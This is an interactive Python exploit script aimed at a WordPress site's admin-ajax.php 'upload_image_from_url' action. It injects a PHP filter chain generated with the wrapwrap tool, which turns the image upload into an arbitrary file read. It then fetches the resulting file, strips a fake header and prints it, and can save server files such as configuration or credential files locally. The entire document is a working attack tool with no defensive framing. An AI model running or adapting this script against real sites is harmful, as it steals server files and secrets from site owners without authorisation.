#!/usr/bin/env python3

import requests
import re
import argparse
import random
import json
import sys
import readline

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True, help='The target URL (e.g. http://subdomain.vulnerable.tld) - Don\'t include any URL path component')
parser.add_argument('-c', '--chain', required=True, help='The filepath of the chain file from wrapwrap (see: https://github.com/ambionics/wrapwrap)')
parser.add_argument('-ct', '--content-type', required=True, help='The content type that your filter chain pretends to use')
parser.add_argument('--prefix-len', type=int, default=0, help='The length of the PREFIX to remove from the file in the response. Ex to remove the \"GIF89a\\n\" header use `--prefix-len 8')
parser.add_argument('--suffix-len', type=int, default=0, help='The length of the SUFFIX to remove from the file in the response')
parser.add_argument('--download', action='store_true', help='Download the file if it exists, instead of just printing it to the terminal')
args = parser.parse_args()

# Strip http(s):// from the target URL
target = re.sub(r'^https?://', '', args.target)
    

# Construct the headers and data dictionaries
headers = {
    "host": target,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{target}",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": f"http://{target}/",
    "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
    "Sec-GPC": "1"
}



# Read the contents of the chain file.
def build_filter_chain(resource):
    with open(args.chain, 'r') as f:
        fc = f.read().rstrip()
        idx = fc.find("resource=")
        if idx != -1:
            return fc[:idx + len("resource=")] + resource
        return fc + resource

# Try to upload the payload, using the provided filter chain
def upload_payload(requested_resource, file_id=1, timeout=3):
    url = f'{args.target}/wp-admin/admin-ajax.php'
    data = {
        "action": "upload_image_from_url",
        "url": build_filter_chain(requested_resource),
        "id": file_id,
        "accepted_files": args.content_type
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=timeout)
        resp.raise_for_status()
        if 200 <= resp.status_code <= 299:
            json_data = resp.json()
            return json_data
        else:
            print(f"Response status code: {resp.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    except requests.exceptions.HTTPError as e:
        print(f"HTTP error: {e}")
    except requests.exceptions.Timeout as e:
        print(f"Request timed out: {e}")
    return False


def download_resource(resource_url, timeout=3):
    try:
        resp = requests.get(resource_url, timeout=timeout)
        resp.raise_for_status()
        return resp.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    except requests.exceptions.HTTPError as e:
        print(f"HTTP error: {e}")
    except requests.exceptions.Timeout as e:
        print(f"Request timed out: {e}")
        
def write_contents(resource, contents):
    resource_name = resource
    i = resource.rfind('/')
    if i >= 0 and i < len(resource):
        resource_name = resource[i+1:]
    with open(f'./{resource_name}', 'wb') as f:
        f.write(contents.encode())
        print(f'File written: ./{resource_name}')

while True:
    try:
        resource = input("\nTry to access a filepath:\n>> ")
        if readline.get_history_item(readline.get_current_history_length() - 1) == resource:
            print(resource)
        # make a file ID and re-use it for both requests
        file_id = random.randint(1,99)
        response = upload_payload(resource, file_id)
        print(json.dumps(response, indent=4))
        if not response:
            print("Upload operation failed... Try again, I guess?")
            continue
        if 'response' not in response:
            print("Response has no \"response\" property!")
        resp = download_resource(response.get('response'))
        if resp is not None and len(resp) >= (args.prefix_len + args.suffix_len):
            content = resp[args.prefix_len:len(resp)-args.suffix_len]
            print(content)
            if args.download:
                write_contents(resource, content)
        else:
            print("Response was successful, but empty")
    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit(0)
